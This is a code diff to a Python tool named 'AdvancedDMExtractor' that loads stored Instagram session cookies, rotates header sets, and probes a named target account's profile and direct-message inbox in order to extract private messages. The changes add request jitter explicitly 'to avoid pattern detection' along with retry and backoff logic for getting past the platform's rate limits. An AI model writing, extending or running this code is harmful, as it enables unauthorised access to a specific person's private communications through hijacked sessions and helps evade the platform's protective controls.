@@ -24,10 +24,13 @@ from pathlib import Path
 from target_database_manager import TargetDatabaseManager
 
 class AdvancedDMExtractor:
-    """🎯 Advanced DM Extraction with valid sessions"""
+    """🎯 Advanced DM Extraction with valid sessions and rate limiting protection"""
     
     def __init__(self):
         self.target = "alx.trading"
+        self.base_delay = 3  # Base delay between requests (seconds)
+        self.max_retry = 5   # Maximum retry attempts for 429 errors
+        self.last_request_time = 0  # Track last request time
         self.project_root = "/workspaces/sugarglitch-realops"
         
         # Load all valid sessions
@@ -159,9 +162,16 @@ class AdvancedDMExtractor:
         """Generate valid CSRF token"""
         return base64.b64encode(os.urandom(32)).decode('utf-8')[:32]
     
-    def advanced_session_test(self, session, session_info):
-        """Advanced session validation"""
+    def advanced_session_test(self, session_info, header_set):
+        """🔍 Advanced session testing with smart rate limiting"""
         print(f"🔍 Testing session: {session_info['file']}")
+        
+        # Convert session to headers format
+        session = self.create_advanced_session(session_info, header_set)
+        cookie_header = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
+        headers = session.headers.copy()
+        if cookie_header:
+            headers['Cookie'] = cookie_header
         
         test_results = {
             'session_file': session_info['file'],
@@ -170,49 +180,68 @@ class AdvancedDMExtractor:
         
         # Test 1: Basic Instagram access
         try:
-            response = session.get('https://www.instagram.com/', timeout=10)
-            test_results['tests']['basic_access'] = {
-                'status': response.status_code,
-                'success': response.status_code == 200,
-                'response_size': len(response.content)
-            }
-            print(f"   📡 Basic access: {response.status_code}")
+            print(f"   📡 Testing basic access...")
+            response = self.smart_request('https://www.instagram.com/', headers, session_name=session_info['file'])
+            if response:
+                test_results['tests']['basic_access'] = {
+                    'status': response.status_code,
+                    'success': response.status_code == 200,
+                    'response_size': len(response.content)
+                }
+                print(f"   📡 Basic access: {response.status_code}")
+            else:
+                test_results['tests']['basic_access'] = {'error': 'No response received'}
         except Exception as e:
             test_results['tests']['basic_access'] = {'error': str(e)}
             print(f"   ❌ Basic access failed: {e}")
         
-        # Test 2: Profile access
+        # Test 2: Profile access  
         try:
-            response = session.get(f'https://www.instagram.com/{self.target}/', timeout=10)
-            test_results['tests']['profile_access'] = {
-                'status': response.status_code,
-                'success': response.status_code == 200,
-                'profile_found': 'Sorry, this page' not in response.text,
-                'private': 'This account is private' in response.text
-            }
-            print(f"   👤 Profile access: {response.status_code}")
+            print(f"   👤 Testing profile access...")
+            response = self.smart_request(f'https://www.instagram.com/{self.target}/', headers, session_name=session_info['file'])
+            if response:
+                test_results['tests']['profile_access'] = {
+                    'status': response.status_code,
+                    'success': response.status_code == 200,
+                    'profile_found': 'Sorry, this page' not in response.text,
+                    'private': 'This account is private' in response.text
+                }
+                print(f"   👤 Profile access: {response.status_code}")
+            else:
+                test_results['tests']['profile_access'] = {'error': 'No response received'}
         except Exception as e:
             test_results['tests']['profile_access'] = {'error': str(e)}
             print(f"   ❌ Profile access failed: {e}")
         
-        # Test 3: Direct inbox access
+        # Test 3: Direct access
         try:
-            response = session.get('https://www.instagram.com/direct/', timeout=10)
-            test_results['tests']['direct_access'] = {
-                'status': response.status_code,
-                'success': response.status_code in [200, 302],
-                'redirect': response.status_code == 302
-            }
-            print(f"   📨 Direct access: {response.status_code}")
+            print(f"   📨 Testing direct access...")
+            response = self.smart_request('https://www.instagram.com/direct/inbox/', headers, session_name=session_info['file'])
+            if response:
+                test_results['tests']['direct_access'] = {
+                    'status': response.status_code,
+                    'success': response.status_code == 200,
+                    'redirect': 'login' in response.url
+                }
+                print(f"   📨 Direct access: {response.status_code}")
+            else:
+                test_results['tests']['direct_access'] = {'error': 'No response received'}
         except Exception as e:
             test_results['tests']['direct_access'] = {'error': str(e)}
             print(f"   ❌ Direct access failed: {e}")
         
         return test_results
     
-    def advanced_profile_extraction(self, session, session_info):
-        """Advanced profile data extraction"""
+    def advanced_profile_extraction(self, session_info, header_set):
+        """Advanced profile data extraction with smart rate limiting"""
         print(f"🔍 Advanced profile extraction using: {session_info['file']}")
+        
+        # Convert session to headers format
+        session = self.create_advanced_session(session_info, header_set)
+        cookie_header = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
+        headers = session.headers.copy()
+        if cookie_header:
+            headers['Cookie'] = cookie_header
         
         profile_data = {
             'session_used': session_info['file'],
@@ -221,10 +250,10 @@ class AdvancedDMExtractor:
         }
         
         try:
-            # Get profile page
-            response = session.get(f'https://www.instagram.com/{self.target}/', timeout=15)
+            # Get profile page with smart rate limiting
+            response = self.smart_request(f'https://www.instagram.com/{self.target}/', headers, session_name=session_info['file'])
             
-            if response.status_code == 200:
+            if response and response.status_code == 200:
                 content = response.text
                 
                 # Extract various data points
@@ -266,9 +295,9 @@ class AdvancedDMExtractor:
             else:
                 profile_data['data'] = {
                     'page_accessible': False,
-                    'error_code': response.status_code
+                    'error_code': response.status_code if response else 'No response'
                 }
-                print(f"   ❌ Profile access failed: {response.status_code}")
+                print(f"   ❌ Profile access failed: {response.status_code if response else 'No response'}")
                 
         except Exception as e:
             profile_data['data'] = {'error': str(e)}
@@ -332,6 +361,79 @@ class AdvancedDMExtractor:
         
         return endpoint_results
     
+    def smart_request(self, url, headers, method='GET', data=None, session_name="unknown"):
+        """🎯 Smart request with rate limiting protection and retry logic"""
+        
+        # Ensure minimum delay between requests
+        elapsed = time.time() - self.last_request_time
+        if elapsed < self.base_delay:
+            sleep_time = self.base_delay - elapsed
+            print(f"   ⏱️ Rate limiting protection: waiting {sleep_time:.1f}s")
+            time.sleep(sleep_time)
+        
+        retry_count = 0
+        while retry_count < self.max_retry:
+            try:
+                # Add random jitter to avoid pattern detection
+                jitter = random.uniform(0.5, 2.0)
+                if retry_count > 0:
+                    print(f"   🔄 Retry attempt {retry_count}/{self.max_retry}")
+                    time.sleep(jitter)
+                
+                self.last_request_time = time.time()
+                
+                if method.upper() == 'POST':
+                    response = requests.post(url, headers=headers, data=data, timeout=30)
+                else:
+                    response = requests.get(url, headers=headers, timeout=30)
+                
+                # Handle different response codes
+                if response.status_code == 429:
+                    print(f"   ⚠️ HTTP 429 - Too Many Requests (Session: {session_name})")
+                    
+                    # Check for Retry-After header
+                    retry_after = response.headers.get('Retry-After')
+                    if retry_after:
+                        wait_time = int(retry_after)
+                        print(f"   ⏰ Server says wait {wait_time}s (Retry-After header)")
+                        time.sleep(wait_time)
+                    else:
+                        # Exponential backoff
+                        wait_time = random.uniform(5, 15) * (retry_count + 1)
+                        print(f"   ⏰ Exponential backoff: waiting {wait_time:.1f}s")
+                        time.sleep(wait_time)
+                    
+                    retry_count += 1
+                    continue
+                
+                elif response.status_code in [200, 201, 404]:
+                    # Success or acceptable response
+                    return response
+                
+                else:
+                    print(f"   ⚠️ HTTP {response.status_code} (Session: {session_name})")
+                    if retry_count < self.max_retry - 1:
+                        wait_time = random.uniform(2, 8)
+                        print(f"   ⏰ Retrying after {wait_time:.1f}s...")
+                        time.sleep(wait_time)
+                        retry_count += 1
+                        continue
+                    return response
+                    
+            except requests.RequestException as e:
+                print(f"   ❌ Request error: {e}")
+                if retry_count < self.max_retry - 1:
+                    wait_time = random.uniform(3, 10)
+                    print(f"   ⏰ Retrying after {wait_time:.1f}s...")
+                    time.sleep(wait_time)
+                    retry_count += 1
+                    continue
+                raise
+        
+        # If we get here, all retries failed
+        print(f"   ❌ All retry attempts failed for {url}")
+        return response if 'response' in locals() else None
+
     def perform_advanced_extraction(self):
         """Perform advanced extraction using all available techniques"""
         print(f"\n🎯 STARTING ADVANCED DM EXTRACTION")
@@ -370,11 +472,8 @@ class AdvancedDMExtractor:
                 print(f"   🔄 Header set {j+1}/{len(self.header_sets)}")
                 
                 try:
-                    # Create advanced session
-                    session = self.create_advanced_session(session_info, headers)
-                    
                     # Test session validity
-                    session_test = self.advanced_session_test(session, session_info)
+                    session_test = self.advanced_session_test(session_info, headers)
                     session_test['header_set'] = j + 1
                     extraction_results['session_tests'].append(session_test)
                     
@@ -383,12 +482,12 @@ class AdvancedDMExtractor:
                         print(f"   ✅ Session appears functional, proceeding with extraction")
                         
                         # Extract profile data
-                        profile_data = self.advanced_profile_extraction(session, session_info)
+                        profile_data = self.advanced_profile_extraction(session_info, headers)
                         profile_data['header_set'] = j + 1
                         extraction_results['profile_extractions'].append(profile_data)
                         
-                        # Test DM endpoints
-                        endpoint_results = self.advanced_dm_endpoint_testing(session, session_info)
+                        # Test DM endpoints  
+                        endpoint_results = self.advanced_dm_endpoint_testing(session_info, headers)
                         for result in endpoint_results:
                             result['session_file'] = session_info['file']
                             result['header_set'] = j + 1
@@ -399,8 +498,8 @@ class AdvancedDMExtractor:
                             extraction_results['successful_extractions'] += 1
                             extraction_results['data_found'] = True
                     
-                    # Delay between attempts
-                    time.sleep(random.uniform(2, 5))
+                    # Delay between attempts for rate limiting protection
+                    time.sleep(random.uniform(3, 8))
                     
                 except Exception as e:
                     print(f"   ❌ Error with session/headers combination: {e}")
